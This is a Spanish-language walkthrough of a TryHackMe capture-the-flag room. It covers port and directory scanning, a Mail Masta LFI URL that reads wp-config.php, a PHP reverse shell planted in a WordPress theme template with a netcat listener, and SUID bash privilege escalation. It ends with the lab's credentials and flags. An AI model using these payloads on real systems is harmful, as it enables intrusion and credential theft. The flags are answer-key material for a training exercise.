Bienvenidos nuevamente a otra sala de TryHackMe. Esta sala esta diseñada con la intencion de encontrar vulnerabilidades y explotarlas de diferentes metodos. En mi caso, enumeraremos la maquina utilizando las herramientas __gobuster__ y __wpscan__ . Luego, obtendremos acceso al servicio buscando su vulnerabilidad basada en #LFI(__LOCAL FILE INCLUSION__) y escalaremos privilegios abusandonos de __bash__ para llegar al sistema raiz.

# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap` 

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.23s latency).
Scanned at 2023-04-07 09:45:47 EDT for 23s
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Nuestro scaner nos muestra 3 puertos abiertos. La distribucion usada es ubuntu en sistema operativo Linux y el servidor Apache.  En estos casos no tendremos mucho que ver, pero siempre es aconsejable observar el codigo fuente de la pagina para inspeccionar mas a fondo. En esta ocasion no encontraremos nada, asique tendremos que enumerar.

# Enumeration
La enumeracion es clave, y es verdad!.Tendremos muchas formas para enumerar un servicio, en mi caso, utilizaremos la herramienta __gobuster__ que enumera diferentes directorios dentro del servicio y poder encontrar mas informacion.
Para ejecutar gobuster, pondremos el siguiente comando : `gobuster dir -u http://IPTARGET -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt`
 

```ruby
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://IPTARGET
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/04/24 14:43:22 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 276]
/wordpress            (Status: 301) [Size: 314] [--> http://IPTARGET/wordpress/]
Progress: 4713 / 4714 (99.98%)
===============================================================
2023/04/24 14:45:08 Finished

```

Una vez encontrado nuestro directorio clave, "__wordpress__", podremos utilizar la herramienta __wpscan__ que se basa en enumerar usuarios, contraseñas e incluso hacer uso de fuerza bruta para entrar al sistema. Ejecutaremos el siguiente comando : `wpscan --url "http://IPTARGET/wordpress"`. 

```ruby
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://IPTARGET/wordpress/ [IPTARGET]
[+] Started: Mon Apr 24 14:50:30 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://IPTARGET/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://IPTARGET/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://IPTARGET/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://IPTARGET/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://IPTARGET/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://IPTARGET/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://IPTARGET/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://IPTARGET/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.2
 | Style URL: http://IPTARGET/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://IPTARGET/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.5, Match: 'Version: 1.5'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] mail-masta
 | Location: http://IPTARGET/wordpress/wp-content/plugins/mail-masta/
 | Latest Version: 1.0 (up to date)
 | Last Updated: 2014-09-19T07:52:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://IPTARGET/wordpress/wp-content/plugins/mail-masta/readme.txt

[+] reflex-gallery
 | Location: http://IPTARGET/wordpress/wp-content/plugins/reflex-gallery/
 | Latest Version: 3.1.7 (up to date)
 | Last Updated: 2021-03-10T02:38:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.1.7 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://IPTARGET/wordpress/wp-content/plugins/reflex-gallery/readme.txt
``` 

Como podemos ver, nos brinda una informacion bastante util, incluso si agregamos al comando `--enumerate u` , podremos enumerar los usuarios que estan registrados en el servicio.. 
```ruby
[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <====================================================================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] elyana
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://IPTARGET/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

```

Ya tendremos informacion valiosa que debemos de echar un vistazo..
>Version Wordpress : 5.5.1
>Tema en uso: twentytwenty
>Plugins : mail-masta & reflex-gallery
>Usuarios : Elyana

# Intrusion

Inicaremos el proceso de intrusion, buscando exploits basados en los plugins que enumeramos anteriormente. Ejecutamos searchsploit para esta tarea : `searchsploit reflex gallery && searchsploit mail masta`
```ruby
 Exploit Title                                                                                                                                                                  |  Path
WordPress Plugin Reflex Gallery - Arbitrary File Upload (Metasploit)                                                                                                            | php/remote/36809.rb
WordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload                                                                                                                   | php/webapps/36374.txt
-------------------------------------------------------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------
'WordPress Plugin Mail Masta 1.0 - Local File Inclusion                                                                                                                          | php/webapps/40290.txt'
WordPress Plugin Mail Masta 1.0 - Local File Inclusion (2)                                                                                                                      | php/webapps/50226.py
WordPress Plugin Mail Masta 1.0 - SQL Injection                                                                                                                                 | php/webapps/41438.txt
-------------------------------------------------------------------------------
```

En mi caso, utilizare el seleccionado, descargamos el archivo .txt : `searchsploit -m php/webapps/40290.txt` y nos muestra que deberemos hacer uso de #LFI(__Local FIle Inclusion__). Con esta vulnerabilidad, podremos abusarnos y enumerar informacion como credenciales, base de datos, archivos de configuracion, entre otros.

Haremos uso de los filtros php, para que nos enumere la configuracion de wordpress "__wp-config.php__" y que nos responda en codigo base64. Nuestro comando nos quedara de la siguiente manera : 
`http://IPTARGET/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php/?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php`

Una vez obtuvimos la respuesta, la decodificaremos en nuestra terminal ejecutando : `echo "BASE64" | base64 -d`, obtendremos las credenciales de elyana para poder acceder a wordpress. Para acceder con nuestras credenciales obtenidas, nos tendremos que dirigir al directorio "__/wordpress/wp-admin".

# Exploit

Una vez obtuvimos acceso con las credenciales de elyana, nos digiriremos dentro del editor de temas (Appareance/Theme-Editor). Seleccionamos en la columna "__Theme FIles__" el que esta listado como "__404 Template__" y pegaremos una reverse shell que puede ser a eleccion, yo utilizare una bastante popular de pentestmonkey "https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php", tendremos que configurar la __IP__ y __PUERTO__ de nuestra maquina atacante!, una vez realizado el proceso, en nuestra maquina atacante, nos pondremos en escucha para luego recibir la respuesta del y obtener una shell dentro del sistema como www-data. `nc -nvlp PUERTO`

Para obtener respuesta en la terminal de nuestra maquina atacante, deberemos ir al enlance donde pegamos nuestra reverse-shell, que estara alojada en "http://IPTARGET/wordpress/wp-admin/theme-editor.php?file=404.php&theme=twentytwenty". Una vez visitada, ya tendremos nuestra shell con privilegios www-data.

# Priv. Escalation

Para escalar privilegios dentro de este sistema, tendremos que enumerar los permisos de root y en donde estan alojados, utilizaremos __find__ para esta tarea ejecutando : `find / -perm -4000 2> /dev/null | xargs ls -lah`.

```ruby
-rwsr-sr-x 1 root   root       1.1M Jun  6  2019 /bin/bash
-rwsr-sr-x 1 root   root        59K Jan 18  2018 /bin/chmod
-rwsr-xr-x 1 root   root        31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root   root        43K Sep 16  2020 /bin/mount
-rwsr-xr-x 1 root   root        63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root   root        44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root   root        27K Sep 16  2020 /bin/umount
-rwsr-sr-x 1 daemon daemon      51K Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root   root        75K Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root   root        44K Mar 22  2019 /usr/bin/chsh
...
```

Como tiene permisos alojados en /bin/bash, podremos consultar en la pagina "https://gtfobins.github.io/gtfobins/" y buscar por permisos __bash__. Utilizaremos el metodo __SUID__ para esta tarea, un metodo simple, solo tendremos que ejecutar `bash -p` y ya tendremos acceso al sistema raiz!

# Respuestas

#credentials = elyana: H@ckme@123
#FLAG = THM{49jg666alb5e76shrusn49jg666alb5e76shrusn}
#ROOT = THM{uem2wigbuem2wigb68sn2j1ospi868sn2j1ospi8}